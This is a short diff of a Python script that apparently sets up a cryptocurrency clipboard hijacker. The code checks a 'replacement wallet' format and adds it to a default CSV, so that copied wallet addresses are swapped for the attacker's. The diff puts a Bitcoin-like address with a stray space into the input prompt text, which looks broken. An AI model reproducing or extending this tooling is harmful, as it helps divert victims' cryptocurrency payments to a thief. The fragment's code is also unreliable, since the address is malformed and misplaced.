@@ -25,7 +25,7 @@ if __name__ == "__main__":
     )
     print("======================================================")
     wallet_to_check = ConsoleView().rich_input(
-        "Please enter first replacement wallet:")
+        "bc1qn8kp6rh0gm0vlq5x8cx903ljd9 x03wr4sgrmar")
     checked_wallet = ClipboardController().check_wallet_format(wallet_to_check)
     if checked_wallet != None:
         WalletsController().add_wallet_to_default_csv(
